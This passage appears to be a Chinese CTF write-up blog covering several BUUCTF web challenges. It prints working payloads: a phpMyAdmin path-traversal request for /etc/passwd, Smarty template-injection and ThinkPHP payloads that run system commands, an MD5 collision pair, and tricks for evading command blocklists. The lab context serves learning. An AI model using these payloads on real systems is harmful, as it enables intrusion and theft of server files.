bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, NULL, <span class="variable">$_GET</span>[<span class="string">'exp'</span>])</span><br><span class="line"></span><br><span class="line">\(和\)表示转义括号</span><br><span class="line">(?R)?表示引用当前表达式</span><br><span class="line">```     </span><br><span class="line">大致意思就是可以使用函数，但是函数中不能有参数</span><br><span class="line">```bash</span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line">scandir() 列出 images 目录中的文件和目录。</span><br><span class="line">readfile() 输出一个文件。</span><br><span class="line">current() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line">pos() current() 的别名。</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">array_reverse()以相反的元素顺序返回数组。</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码。</span><br></pre></td></tr></table></figure><p>查看有哪些文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>打印flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure><p>解释  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">scandir(current(localeconv()))是查看当前目录</span><br><span class="line">加上array_reverse()是将数组反转，即Array([0]=&gt;index.php[1]=&gt;flag.php=&gt;[2].git[3]=&gt;..[4]=&gt;.)</span><br><span class="line">再加上next()表示内部指针指向数组的下一个元素，并输出，即指向flag.php</span><br><span class="line">highlight_file()打印输出或者返回 filename 文件中语法高亮版本的代码</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>先上传 <code>.htaccess</code> 文件，注意抓包，要修改 TYPE 为 jpeg </p><h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=cat /flag</span><br></pre></td></tr></table></figure><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>index.php 转化为 16 进制，并 base64 两次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixi锝� no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制了类型为string，且比较类型为强类型，需要硬碰撞出两个md5一样的字符串，抄一个现成的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>命令执行绕过<br>Linux下的命令执行有很多绕过方法</p><ul><li>在命令中穿插\，不会影响命令执行，如c\at /fl\ag</li><li>sort命令用于将文本文件内容加以排序。sort可针对文本文件的内容，以行为单位来排序。sort%20/flag</li></ul><p><img src="../../images/ctf/buuctf/8.jpg" alt=""></p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>git 泄露 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure><p>可以看到有三个有输出的exit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="variable">$is</span>);</span><br></pre></td></tr></table></figure><p>找一个最简单的，第二个exit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]) &amp;&amp; !isset(<span class="variable">$_POST</span>[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要不给flag传值就会退出，退出的时候会显示$yds的值，而$yds的值在代码最开始的时候初始化过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$yds</span> = <span class="string">"dog"</span>;</span><br></pre></td></tr></table></figure><p>初始化和exit之间有代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = $<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">我们只要在这段代码中令<span class="variable">$yds</span>=<span class="variable">$flag</span>，将原来<span class="variable">$yds</span>变量的值进行覆盖，同时符合退出条件，就可以输出拿到flag</span><br></pre></td></tr></table></figure><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>版本为4.81，经查询，存在远程文件读取漏洞</p><p>直接上payload读取passwd文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>存在smarty注入payload。<br>网址：<a href="https://www.jianshu.com/p/eb8d0137a7d3" target="_blank" rel="noopener">https://www.jianshu.com/p/eb8d0137a7d3</a>    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">'ls'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">'/flag'</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">'/flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">'cat ../../../flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment">#本题payload</span></span><br></pre></td></tr></table></figure><p>payload如下： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: node3.buuoj.cn:29925</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: &#123;<span class="keyword">if</span> system(<span class="string">'cat ../../../flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="comment">#_init_初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个if：如果checkSign(self) 返回 True ，则进入下一个if</span></span><br><span class="line"><span class="comment">#审计checkSign(self)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line"><span class="comment">#如果scan在action里面，则我们可以让param进入scan这个函数，并的目录下创建一个result.txt </span></span><br><span class="line"><span class="comment">#然后通过scan()函数把名字为param的网址里的内容写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment">#如果read在action里面，则我们可以读取读取result.txt的内容赋值给result</span></span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action,self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#如果getSign(self.action, self.param)和self.sign相等则返回True ,否则返回False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#提取get方法传入的，参数名叫param对应得值，并将其url编码后赋值给param</span></span><br><span class="line"><span class="comment">#将scan赋值给action</span></span><br><span class="line"><span class="comment">#审计 getSign()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#以get方法传入param参数值，在cookie里面传递action和sign的值</span></span><br><span class="line"><span class="comment">#使param绕过waf，审计waf</span></span><br><span class="line"><span class="comment">#用我们传进去的 action 、 param  、sign  、ip 这四个参数构造一个Task类对象，并且执行它的Exec方法</span></span><br><span class="line"><span class="comment">#审计Task</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#将secert_key 、param 、 action这三个值连接起来后进行md5加密，并将其作为十六进制数据字符串值返回</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#移除param头尾指定的字符(默认为空格或换行符)，并将param中中所有大写字符转化为小写</span></span><br><span class="line"><span class="comment">#若param以gopher或file为前缀，返回True,否者返回False</span></span><br><span class="line"><span class="comment">#回到challenge()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>审计从路由开始，然后在慢慢延申出去</p><p>这里有三个路由：</p><p>/geneSign<br>/De1ta<br>/<br>从/De1ta开始看起，首先是创建了一个Task的类，action、sign的值是由cookie得到，而param的值就是直接通过GET方法传递param参数的值得到，ip就是你的ip地址，接着param参数会经过waf，如果过了waf，则执行这个类的Exec。<br>顺着这个思路，我们追溯到waf这个方法上,通过审计我们知道要绕过waf，param的值不能以 gopher和file开头</p><p>接下去执行Task里的Exec方法，通过审计我们发现如果checkSign(self) 为真 ，则可以传递/De1ta页面的param参数进入到scan方法，并的目录下创建一个result.txt ，然后通过scan()函数把参数param的值写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</p><p>审计checkSign(self) 函数，发现如果getSign(cookie传入的action, get传入的param)和cookie传入的sign相等则返回True ,否则返回False</p><p>审计getSign(),我们发现不知道secert_key的值，但是路由/geneSign有一个return getSign(scan, param)，这里我们另/geneSign页面的参数param的值为flag.txtread(这里为什么后面会讲到)，通过getSign得到的sign值即为md5(secert_key + ‘flag.txtread’ + ‘scan’)</p><p>回到Task类的Exec方法if “read” in self.action:如果read在action里面，则我们可以读取读取result.txt的内容赋值给result，这里result.txt的值实际上是我们传入的param的值</p><p>在这里就可以解释为什么/geneSign页面我们传入的param的值要为flag.txtread了，因为结合Exec方法，我们要实现写入文件和读出的功能，就必须另//De1ta页面的action为readsacn或scanread,此时的getSign(),返回的值就是hashlib.md5(secert_key + flag.txt + readscan).hexdigest(),而此时只有另/geneSign页面的param参数为flag.txtread才能使</p><p>getSign(self.action, self.param) == getSign(flag.txt+readscan) ,</p><p>即md5(secret_key+flag.txtread+scan) == md5(secret_key+flag.txt+readscan)</p><p>所以第二步就是在/De1ta页面，get ?param=flag.txt ,cookie action=readscan ,sign=我们在/geneSign页面得到的md5值，这样就可以得到flag了 </p><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 